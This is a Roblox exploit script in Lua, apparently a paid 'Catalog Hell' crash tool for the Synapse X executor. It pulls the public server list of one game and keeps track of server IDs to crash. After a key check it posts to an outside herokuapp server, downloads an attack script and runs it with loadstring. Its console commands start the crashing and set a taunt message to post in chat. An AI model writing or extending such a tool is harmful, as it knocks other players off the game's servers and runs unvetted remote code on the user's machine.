--[[
	id: kXmAUlw2KF5mI6uVLyaOO
	name: CSV2
	description: Crash Script Version 2
	time1: 2021-05-26 13:46:15.538276+00
	time2: 2021-05-26 13:46:15.538276+00
	uploader: x2YKWhGC4LHGq4S2VfpLKzlDtrctPVfOolF1yRom
	uploadersession: KD-DiVqt2siTNKRAvHgM-jPfHZ2JhF
	flag: f
--]]

if isfile("Catalog Hell.json") then
    delfile("Catalog Hell.json")
end
if getgenv().Enabled then
    wait(9e9)
else
	getgenv().Enabled = true
end
if not game:IsLoaded() then
    game.Loaded:wait()
end
repeat
    wait()
until game.Players.LocalPlayer

if not syn then
    game.StarterGui:SetCore("ChatMakeSystemMessage", {
        Text = "[Catalog Hell]: Your executor is not supported, please try again with Synapse X.",
        Color = Color3.new(255, 0, 0)
    })
    wait(9e9)
end

rconsoleprint('@@RED@@')
rconsoleprint([[
    _____         _          _                   _   _        _  _ 
   /  __ \       | |        | |                 | | | |      | || |
   | /  \/  __ _ | |_  __ _ | |  ___    __ _    | |_| |  ___ | || |
   | |     / _` || __|/ _` || | / _ \  / _` |   |  _  | / _ \| || |
   | \__/\| (_| || |_| (_| || || (_) || (_| |   | | | ||  __/| || |
    \____/ \__,_| \__|\__,_||_| \___/  \__, |   \_| |_/ \___||_||_|
                                        __/ |                      
                                       |___/                       
]])
rconsolename("Catalog Hell Authentication | discord.gg/9c53xbzwx8")
function console(msg)
    rconsoleprint("\n")
    rconsoleprint('@@BLUE@@')
    rconsoleprint(msg)
    rconsoleprint('@@WHITE@@')
    rconsoleprint("\n")
end

local commands = {
    "start",
    "chat",
}

local function handlerequest(request)
    for i,v in pairs(commands) do
        if string.find(request, v) then
            if v == "chat" then
                ChatMessage = request:gsub("chat", "")
                console("Set chat message to: "..ChatMessage .."\n")
            elseif v == "start" then
                start()
                writefile("Catalog Hell Status.txt", "true")
                console("Started crashing.\n")
            else
                console("Syntax error / invalid command, please try again.\n")
            end
        end
    end
    rconsoleprint("@@WHITE@@")
    local input = rconsoleinput()
    handlerequest(input)
end

-------------------------------------------------------

function start()
    local SiteStuff = ""
    local currentSite;
    if SiteStuff == "" then
        currentSite = game.HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/26838733/servers/Public?sortOrder=Asc&limit=100'))
    else
        currentSite = game.HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/26838733/servers/Public?sortOrder=Asc&limit=100&cursor=' .. SiteStuff))
    end
    if currentSite.nextPageCursor and currentSite.nextPageCursor ~= "null" and currentSite.nextPageCursor ~= nil then
        SiteStuff = currentSite.nextPageCursor
    end
    CurrentlyPlaying = 0
    pcall(function()
        ServerCount = #currentSite.data
        for i, v in pairs(currentSite.data) do
            CurrentlyPlaying = CurrentlyPlaying + (v.playing)
        end
    end)
    if ChatMessage ~= false then
        CH_Data = {
            CurrentID = "",
            NumberOfServers = #currentSite.data,
            NumberOfPlayers = CurrentlyPlaying,
            AllIDs = {},
            CrashedIDs = {},
            SillyGuitar = data,
            CustomChatMessage = ChatMessage,
        }
    else
        CH_Data = {
            CurrentID = "",
            NumberOfServers = #currentSite.data,
            NumberOfPlayers = CurrentlyPlaying,
            AllIDs = {},
            CrashedIDs = {},
            SillyGuitar = data,
        }
    end
    pcall(function()
        writefile("Catalog Hell.json", game:GetService('HttpService'):JSONEncode(CH_Data))
    end)
end

local ScreenGui = Instance.new("ScreenGui")
syn.protect_gui(ScreenGui)
local Background = Instance.new("Frame")
local UICorner = Instance.new("UICorner")
local TextBox = Instance.new("TextBox")
local UITextSizeConstraint = Instance.new("UITextSizeConstraint")
ScreenGui.Parent = game.CoreGui
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
Background.Name = "Background"
Background.Parent = ScreenGui
Background.BackgroundColor3 = Color3.fromRGB(255, 145, 164)
Background.BorderSizePixel = 0
Background.Position = UDim2.new(0.375, 0, 0.449999988, 0)
Background.Size = UDim2.new(0.25, 0, 0.100000001, 0)
UICorner.CornerRadius = UDim.new(0, 6)
UICorner.Parent = Background
TextBox.Parent = Background
TextBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextBox.BackgroundTransparency = 1.000
TextBox.BorderColor3 = Color3.fromRGB(27, 42, 53)
TextBox.BorderSizePixel = 0
TextBox.Size = UDim2.new(1, 0, 1, 0)
TextBox.ClearTextOnFocus = false
TextBox.Font = Enum.Font.GothamSemibold
TextBox.PlaceholderColor3 = Color3.fromRGB(61, 61, 61)
TextBox.PlaceholderText = "Key"
TextBox.Text = ""
TextBox.TextColor3 = Color3.fromRGB(0, 0, 0)
TextBox.TextScaled = true
TextBox.TextSize = 1.000
TextBox.TextWrapped = true
UITextSizeConstraint.Parent = TextBox
UITextSizeConstraint.MaxTextSize = 24
TextBox.FocusLost:Connect(function(enterPressed)
    if enterPressed and not authenticating then
        console("Authenticating...")
        authenticating = true
        local Response = syn.request({
            Url = "https://catalog-hell.herokuapp.com/login",
            Method = "POST",
            Headers = {
                    ["Content-Type"] = "application/json"
            },
            Body = game:GetService("HttpService"):JSONEncode({
                key = TextBox.Text
            })
        })
        local Body = game:GetService("HttpService"):JSONDecode(Response.Body)
        
        if Body["token"] ~= nil then
            Response = syn.request({
                Url = "https://catalog-hell.herokuapp.com/requestscript",
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = game:GetService("HttpService"):JSONEncode({
                    token = Body["token"]
                })
            })
            Body = game:GetService("HttpService"):JSONDecode(Response.Body)
            if Body["script"] ~= nil then
                writefile("Catalog Hell Status.txt", "false")
                syn.unprotect_gui(ScreenGui)
                ScreenGui:Destroy()
                console("Successfully authenticated, commands: \nstart (start crashing)\nchat [text of your choice] (send a custom chat message when crashing servers)\n")
                spawn(function()
                    handlerequest("")
                end)
                ChatMessage = false
                Delay = false
                data = syn.crypt.encrypt(Body["script"], "469266217932486245302")
                writefile("Catalog Hell Status.txt", "false")
                loadstring(Body["script"])()
            end
        else
            console("Authentication failed, not whitelisted.")
            authenticating = false
        end
    end
end)